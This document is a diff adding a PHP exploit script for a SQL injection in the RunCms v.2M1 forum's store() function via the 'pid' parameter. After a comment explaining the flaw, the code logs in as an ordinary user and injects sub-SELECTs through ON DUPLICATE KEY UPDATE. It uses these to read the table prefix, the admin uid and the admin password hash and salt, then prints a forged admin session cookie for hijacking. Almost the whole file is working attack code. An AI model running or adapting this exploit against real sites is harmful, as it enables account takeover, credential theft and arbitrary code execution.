@@ -1,0 +1,326 @@
+<?php
+    /*
+    RunCms v.2M1 store() - 'pid' remote SQL Injection Exploit
+    by Nine:Situations:Group::bookoo
+    site: http://retrogod.altervista.org/
+     
+    software site: http://www.runcms.org/
+     
+    Function store() in /modules/forum/class/class.forumposts.php is vulnerable, see lines 412-433:
+     
+    ...
+    $sql = "
+    INSERT INTO ".$bbTable['posts']." SET
+    post_id=".$this->post_id.",
+    pid=".$this->pid.",
+    topic_id=".$this->topic_id.",
+    forum_id=".$this->forum_id.",
+    post_time=$datetime,
+    uid=".$this->uid.",
+    poster_ip='".$this->poster_ip."',
+    subject='".$subject."',
+    post_text='".$post_text."',
+    allow_html=".intval($this->allow_html).",
+    allow_smileys=".intval($this->allow_smileys).",
+    allow_bbcode=".intval($this->allow_bbcode).",
+    type='".$this->type."',
+    icon='".$this->icon."',
+    has_attachment=".intval($this->has_attachment).",
+    is_approved=".intval($this->is_approved).",
+    anon_uname='".$this->anon_uname."',
+    attachsig=".$this->attachsig."";
+     
+    if ( !$result = $db->query($sql) ) {
+    ...
+     
+    this function is called by /modules/forum/post.php near lines 153-158:
+     
+    ...
+    $postid = $forumpost->store();
+     
+    if ($isreply == 1) {
+    $sql = "SELECT t.topic_notify, u.email, u.uname, u.uid FROM ".$bbTable['topics']." t, ".$db->prefix("users")." u WHERE t.topic_id = ".$_POST['topic_id']." AND t.topic_poster = u.uid";
+    ...
+     
+    see? The next query is also vulnerable in $_POST['topic_id'] argument... but I choose
+    the store() one because is an INSERT.
+     
+    $this->pid is set in /modules/forum/post.php at lines 94-96:
+    ...
+    if (isset($_POST['pid']) && $_POST['pid'] != "") {
+    $forumpost->setParent($_POST['pid']);
+    }
+    ...
+     
+    No prior sanitization!
+     
+    You can use a sub-SELECT to save the admin hash and salt in forum posts.
+    Even if posts are in moderation, the subject field is visible in user profiles.
+    You cannot break the query by '--' or '/*' but you can use the
+    'ON DUPLICATE KEY UPDATE' clause to build a working one.
+     
+    This whole thing works regardless of magic_quotes_gpc and with MySQL >= 4.1.
+    You need a valid user account (register!) and the permission to post in a certain forum.
+    Once you obtained the admin hash and salt you can hijack an active session
+    and execute arbitrary code, see: http://retrogod.altervista.org/9sg_runcms_forum_sql.html
+     
+    */
+     
+    $err[0] = "[!] This script is intended to be launched from the cli!";
+    $err[1] = "[!] You need the curl extesion loaded!";
+     
+    function my_header() {
+        print ("\x52\x75\x6e\x43\x6d\x73\x20\x76\x2e\x32\x4d\x31\x20\x73\x74\x6f\x72\x65\x28\x29\x20\x2d\x20\x27\x70\x69\x64\x27\x20\x72\x65\x6d\x6f\x74\x65\x20\x53\x51\x4c\x20\x49\x6e\x6a\x65\x63\x74\x69\x6f\x6e\x20\x45\x78\x70\x6c\x6f\x69\x74\x20\xd\xa\x20\x20\x20\x20\x62\x79\x20\x4e\x69\x6e\x65\x3a\x53\x69\x74\x75\x61\x74\x69\x6f\x6e\x73\x3a\x47\x72\x6f\x75\x70\x3a\x3a\x62\x6f\x6f\x6b\x6f\x6f\xd\xa\x20\x20\x20\x20\x73\x69\x74\x65\x3a\x20\x68\x74\x74\x70\x3a\x2f\x2f\x72\x65\x74\x72\x6f\x67\x6f\x64\x2e\x61\x6c\x74\x65\x72\x76\x69\x73\x74\x61\x2e\x6f\x72\x67\x2f\xd\xa");
+    }
+     
+    my_header();
+     
+    if (php_sapi_name() <> "cli") {
+        die($err[0]);
+    }
+    if (!extension_loaded('curl')) {
+        $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true :
+        false;
+        if ($win) {
+            !dl("php_curl.dll") ? die($err[1]) :
+             print("[*] curl loaded\n");
+        } else {
+            !dl("php_curl.so") ? die($err[1]) :
+             print("[*] curl loaded\n");
+        }
+    }
+     
+    function syntax() {
+        print (
+        "Syntax: php ".$argv[0]." [host] [path] [user] [pass] [forum] [OPTIONS] \n". "Options:                                                                    \n". "--port:[port]         - specify a port                                      \n". "                        default->80                                         \n". "--prefix              - try to extract table prefix from information.schema \n". "                        default->runcms                                     \n". "--proxy:[host:port]   - use proxy                                           \n". "--skiptest            - skip preliminary tests                              \n". "--test                - run only tests                                      \n". "Examples:   php ".$argv[0]." 192.168.0.1 /runcms/ bookoo pass 1              \n". "            php ".$argv[0]." 192.168.0.1 / bookoo pass 1 --prefix --proxy:1.1.1.1:8080   \n");
+        die();
+    }
+     
+    error_reporting(E_ALL ^ E_NOTICE);
+    $host = $argv[1];
+    $path = $argv[2];
+    $_user = $argv[3];
+    $_pass = $argv[4];
+    $_forum = (int)$argv[5];
+     
+    $prefix = "runcms";
+     
+     
+    $argv[5] ? print("[*] Attacking...\n") :
+    syntax();
+     
+    $_f_prefix = false;
+    $_use_proxy = false;
+    $port = 80;
+    $_skiptest = false;
+    $_test = false;
+     
+    for ($i = 3; $i < $argc; $i++) {
+        if (stristr($argv[$i], "--prefix")) {
+            $_f_prefix = true;
+        }
+        if (stristr($argv[$i], "--proxy:")) {
+            $_use_proxy = true;
+            $tmp = explode(":", $argv[$i]);
+            $proxy_host = $tmp[1];
+            $proxy_port = (int)$tmp[2];
+        }
+        if (stristr($argv[$i], "--port:")) {
+            $tmp = explode(":", $argv[$i]);
+            $port = (int)$tmp[1];
+        }
+        if (stristr($argv[$i], "--skiptest")) {
+            $_skiptest = true;
+        }
+        if (stristr($argv[$i], "--test")) {
+            $_test = true;
+        }
+         
+    }
+     
+    function _s($url, $is_post, $ck, $request) {
+        global $_use_proxy, $proxy_host, $proxy_port;
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        if ($is_post) {
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $request."\r\n");
+        }
+        curl_setopt($ch, CURLOPT_HEADER, 1);
+        $cookies = array("Cookie: ".$ck);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, $cookies);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, "Googlebot/2.1");
+        curl_setopt($ch, CURLOPT_TIMEOUT, 0);
+         
+        if ($_use_proxy) {
+            curl_setopt($ch, CURLOPT_PROXY, $proxy_host.":".$proxy_port);
+        }
+        $_d = curl_exec($ch);
+        if (curl_errno($ch)) {
+            die("[!] ".curl_error($ch)."\n");
+        } else {
+            curl_close($ch);
+        }
+        return $_d;
+    }
+     
+    function find_prefix() {
+        global $host, $port, $path, $ck, $_forum, $my_uid;
+        $url = "http://$host:$port".$path."modules/forum/post.php";
+        $_tn = "TABLE_NAME";
+        $_ift = "information_schema.TABLES";
+        $_sql = "1,
+            topic_id=1,
+            forum_id=1,
+            post_time=9999999999,
+            uid=$my_uid,
+            poster_ip=0x3132372e302e302e31,
+            subject=(SELECT CONCAT(0x5b6d5d,$_tn,0x5b2f6d5d) FROM $_ift WHERE $_tn LIKE 0x255f666f72756d5f666f72756d5f67726f75705f616363657373 LIMIT 1 ),
+            post_text=0x68616c6f,
+            allow_html=1,
+            allow_smileys=1,
+            allow_bbcode=1,
+            type=0x75736572,
+            icon=0x61616161,
+            has_attachment=0,
+            is_approved=1,
+            anon_uname=0x61616161,
+            attachsig=0 ON DUPLICATE KEY UPDATE topic_id=1";
+        $_sql = urlencode($_sql);
+        $out = _s($url, 1, $ck, "message=1&forum=$_forum&topic_id=1&pid=".$_sql."&");
+        $url = "http://$host:$port".$path."userinfo.php?uid=$my_uid";
+        $out = _s($url, 0, $ck, "");
+        $tmp = explode("[m]", $out);
+        $tmp = explode("[/m]", $tmp[1]);
+         $prefix = str_replace("_forum_forum_group_access", "", $tmp[0]);
+        echo "[*] Table prefix->".$prefix."\n";
+        return $prefix;
+    }
+     
+    function chk_login($s) {
+        if (stripos ($s, "\x54\x68\x61\x6e\x6b\x20\x79\x6f\x75\x20\x66\x6f\x72\x20\x6c\x6f\x67\x67\x69\x6e\x67\x20\x69\x6e")) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+     
+    function chk_err($s) {
+        if (stripos ($s, "Error No</b>: 0022")) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+     
+    function chk_err_ii($s) {
+        if (stripos ($s, "t have the right to post in this forum")) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+     
+    $url = "http://$host:$port".$path."user.php";
+    $out = _s($url, 1, "", "uname=$_user&pass=$_pass&op=login&");
+    if (chk_login($out)) {
+        print("[*] Logged in!\n");
+    } else {
+        die("[!] Not logged in.");
+    }
+     
+    $tmp = explode("Set-Cookie: ", $out);
+    $ck = "";
+    for ($i = 1; $i < count($tmp); $i++) {
+        $ttmp = explode(" ", $tmp[$i]);
+        $ck .= " ".$ttmp[0];
+    }
+    # echo "[*] Your cookie->".$ck."\n";
+    $tmp = explode("=", $ck);
+    $tmp = str_replace(";", "", $tmp[1]);
+    $tmp = unserialize(urldecode($tmp));
+     $my_uid = (int)$tmp[0];
+    # echo "[*] Your uid->".$my_uid."\n";
+     
+    if (!$_skiptest) {
+        $url = "http://$host:$port".$path."modules/forum/post.php";
+        $out = _s($url, 1, $ck, "message=1&forum=$_forum&topic_id=1&pid=%3D+%28%29%2C&");
+        if (!chk_err_ii($out)) {
+            print("[*] Ok. You can post in this forum\n");
+        } else {
+            die("[!] You don't have the right to post in this forum.");
+        }
+        if (chk_err($out)) {
+            print("[*] Vulnerable!\n");
+        } else {
+            die("[!] Not vulnerable.");
+        }
+         
+    }
+     
+    if ($_test) {
+        die;
+    }
+     
+    if ($_f_prefix == true) {
+        $prefix = find_prefix();
+    }
+     
+    $url = "http://$host:$port".$path."modules/forum/post.php";
+    $_sql = "1,
+        topic_id=1,
+        forum_id=1,
+        post_time=9999999999,
+        uid=$my_uid,
+        poster_ip=0x3132372e302e302e31,
+        subject=(SELECT CONCAT(0x5b6d335d,uid,0x5b2f6d335d) FROM ".$prefix."_users WHERE level=5 LIMIT 1),
+        post_text=0x68616c6f,
+        allow_html=1,
+        allow_smileys=1,
+        allow_bbcode=1,
+        type=0x75736572,
+        icon=0x61616161,
+        has_attachment=0,
+        is_approved=1,
+        anon_uname=0x61616161,
+        attachsig=0 ON DUPLICATE KEY UPDATE topic_id=1";
+    $_sql = urlencode($_sql);
+    $out = _s($url, 1, $ck, "message=1&forum=$_forum&topic_id=1&pid=".$_sql."&");
+    $url = "http://$host:$port".$path."userinfo.php?uid=$my_uid";
+    $out = _s($url, 0, $ck, "");
+    $tmp = explode("[m3]", $out);
+    $tmp = explode("[/m3]", $tmp[1]);
+     $uid = (int)$tmp[0];
+    echo "[*] Admin uid->".$uid."\n";
+     
+    $url = "http://$host:$port".$path."modules/forum/post.php";
+    $_sql = "1,
+        topic_id=1,
+        forum_id=1,
+        post_time=9999999999,
+        uid=$uid,
+        poster_ip=0x3132372e302e302e31,
+        subject=(SELECT CONCAT(0x5b6d325d,pass,0x3a,pwdsalt,0x5b2f6d325d) FROM ".$prefix."_users WHERE uid=$uid LIMIT 1),
+        post_text=0x68616c6f,
+        allow_html=1,
+        allow_smileys=1,
+        allow_bbcode=1,
+        type=0x75736572,
+        icon=0x61616161,
+        has_attachment=0,
+        is_approved=1,
+        anon_uname=0x61616161,
+        attachsig=0 ON DUPLICATE KEY UPDATE topic_id=1";
+    $_sql = urlencode($_sql);
+    $out = _s($url, 1, $ck, "message=1&forum=$_forum&topic_id=1&pid=".$_sql."&");
+    $url = "http://$host:$port".$path."userinfo.php?uid=$uid";
+    $out = _s($url, 0, $ck, "");
+    $tmp = explode("[m2]", $out);
+    $tmp = explode("[/m2]", $tmp[1]);
+     $hash = $tmp[0];
+    echo "[*] Hash:Salt->".$hash."\n";
+    $tmp = explode(":", $hash);
+    print("[*] Admin cookie: rc2_sess=". urlencode(serialize(array($_uid, sha1($tmp[0].$tmp[1]), time()+ 2678400))).";");
+     
+?>
